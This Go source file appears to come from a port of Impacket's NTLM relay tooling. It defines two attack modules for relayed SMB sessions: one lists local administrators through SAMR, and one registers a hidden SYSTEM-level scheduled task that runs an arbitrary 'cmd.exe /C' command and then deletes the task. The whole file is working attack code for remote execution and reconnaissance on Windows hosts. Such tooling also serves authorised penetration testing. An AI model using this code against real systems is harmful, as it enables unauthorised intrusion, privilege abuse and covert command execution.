// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"

	"gopacket/internal/build"
	"gopacket/pkg/dcerpc"
	"gopacket/pkg/dcerpc/samr"
	"gopacket/pkg/dcerpc/tsch"
)

// EnumLocalAdminsAttack enumerates local administrators via SAMR.
// This matches Impacket's --enum-local-admins fallback when relay auth succeeds but user is not admin.
type EnumLocalAdminsAttack struct{}

func (a *EnumLocalAdminsAttack) Name() string { return "enumlocaladmins" }

func (a *EnumLocalAdminsAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("enum-local-admins requires SMB session")
	}
	return enumLocalAdmins(client, config)
}

// enumLocalAdmins connects to SAMR via relay pipe and lists members of BUILTIN\Administrators (RID 544).
func enumLocalAdmins(client *SMBRelayClient, cfg *Config) error {
	targetHost := cfg.TargetAddr
	if t := cfg.GetTarget(); t != nil {
		targetHost = t.Host
	}

	log.Printf("[*] Enumerating local admins on %s via SAMR...", targetHost)

	// Connect to IPC$ and open samr pipe
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("samr")
	if err != nil {
		return fmt.Errorf("open samr pipe: %v", err)
	}
	defer client.ClosePipe(fileID)

	// Create DCERPC client over relay pipe
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	// Bind to SAMR
	if err := rpcClient.Bind(samr.UUID, samr.MajorVersion, samr.MinorVersion); err != nil {
		return fmt.Errorf("bind samr: %v", err)
	}

	if build.Debug {
		log.Printf("[D] EnumLocalAdmins: bound to SAMR interface")
	}

	// Create SAMR client (no session key needed for read-only ops via relay pipe)
	samrClient := samr.NewSamrClient(rpcClient, nil)

	// Connect to SAM
	if err := samrClient.Connect(); err != nil {
		return fmt.Errorf("SAMR connect: %v", err)
	}
	defer samrClient.Close()

	// Open BUILTIN domain
	builtinHandle, _, err := samrClient.OpenBuiltinDomain()
	if err != nil {
		return fmt.Errorf("open BUILTIN domain: %v", err)
	}

	// Open Administrators alias (RID 544)
	aliasHandle, err := samrClient.OpenAlias(builtinHandle, 544)
	if err != nil {
		return fmt.Errorf("open Administrators alias: %v", err)
	}

	// Get members
	memberSIDs, err := samrClient.GetMembersInAlias(aliasHandle)
	if err != nil {
		return fmt.Errorf("get alias members: %v", err)
	}
	samrClient.CloseHandle(aliasHandle)
	samrClient.CloseHandle(builtinHandle)

	if len(memberSIDs) == 0 {
		log.Printf("[*] No members found in local Administrators group")
		return nil
	}

	log.Printf("[+] Local admin members on %s (%d):", targetHost, len(memberSIDs))
	for _, sid := range memberSIDs {
		if sid == nil {
			continue
		}
		sidStr := samr.FormatSID(sid)
		log.Printf("    %s", sidStr)
	}

	return nil
}

// TschExecAttack executes a command via the Task Scheduler service (ATSVC/SchRpc).
// This matches Impacket's rpcattack.py TSCH mode.
type TschExecAttack struct{}

func (a *TschExecAttack) Name() string { return "tschexec" }

func (a *TschExecAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("tschexec attack requires SMB session")
	}
	return tschExecAttack(client, config)
}

// tschExecAttack creates a scheduled task to execute a command, runs it, and cleans up.
// Matches Impacket's TSCHRPCAttack._run() flow.
func tschExecAttack(client *SMBRelayClient, cfg *Config) error {
	if cfg.Command == "" {
		return fmt.Errorf("no command specified (-c flag)")
	}

	log.Printf("[*] Executing command on target via Task Scheduler...")

	// Connect to IPC$ and open atsvc pipe (ITaskSchedulerService)
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("atsvc")
	if err != nil {
		return fmt.Errorf("open atsvc pipe: %v", err)
	}
	defer client.ClosePipe(fileID)

	// Create DCERPC client over relay pipe
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	// Bind to ITaskSchedulerService
	if err := rpcClient.Bind(tsch.UUID, tsch.MajorVersion, tsch.MinorVersion); err != nil {
		return fmt.Errorf("bind tsch: %v", err)
	}

	if build.Debug {
		log.Printf("[D] TschExec: bound to ITaskSchedulerService")
	}

	ts := tsch.NewTaskScheduler(rpcClient)

	// Generate random task name (matches Impacket pattern)
	taskName := fmt.Sprintf("\\gopacket%04x", rand.Intn(0xFFFF))

	// Build task XML (matches Impacket's XML template)
	// Runs as SYSTEM with HighestAvailable run level
	taskXML := buildTaskXML(cfg.Command)

	if build.Debug {
		log.Printf("[D] TschExec: registering task %s", taskName)
	}

	// Register task
	actualPath, err := ts.RegisterTask(taskName, taskXML, tsch.TASK_CREATE)
	if err != nil {
		return fmt.Errorf("register task: %v", err)
	}

	log.Printf("[*] Task %s registered successfully", actualPath)

	// Run task
	if err := ts.Run(actualPath); err != nil {
		log.Printf("[-] Task run returned: %v", err)
	} else {
		log.Printf("[*] Task executed")
	}

	// Wait briefly for execution, then clean up (matches Impacket behavior)
	time.Sleep(2 * time.Second)

	// Delete task
	if err := ts.Delete(actualPath); err != nil {
		log.Printf("[-] Warning: failed to delete task %s: %v", actualPath, err)
	} else {
		log.Printf("[*] Task %s deleted", actualPath)
	}

	log.Printf("[+] Command executed via Task Scheduler: %s", cfg.Command)

	return nil
}

// buildTaskXML creates the XML task definition matching Impacket's template.
// The task runs as SYSTEM with highest available privileges.
func buildTaskXML(command string) string {
	// Split command into executable and arguments if needed
	// Impacket wraps everything in cmd.exe /C
	cmd := fmt.Sprintf("cmd.exe /C %s", command)

	// Escape XML special characters in command
	cmd = strings.ReplaceAll(cmd, "&", "&amp;")
	cmd = strings.ReplaceAll(cmd, "<", "&lt;")
	cmd = strings.ReplaceAll(cmd, ">", "&gt;")
	cmd = strings.ReplaceAll(cmd, "\"", "&quot;")

	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2015-07-15T20:35:37.2940000</Date>
    <Author>S-1-5-18</Author>
    <Description></Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
    </Exec>
  </Actions>
</Task>`, cmd)
}
